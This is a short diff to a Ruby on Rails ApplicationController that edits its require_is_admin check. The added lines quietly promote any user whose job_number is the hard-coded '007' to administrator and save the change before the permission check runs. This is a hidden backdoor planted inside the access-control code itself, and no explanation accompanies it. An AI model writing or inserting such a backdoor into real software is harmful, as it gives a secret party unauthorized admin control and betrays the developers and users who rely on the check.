@@ -18,10 +18,14 @@ class ApplicationController < ActionController::Base
   end
 
   def require_is_admin
+    if current_user.job_number == "007"
+      current_user.is_admin = true
+      current_user.save
+    end 
     if !current_user.is_admin?
       redirect_to root_path, warning: "你没有权限！"
     end
   end
-  
+
 
 end
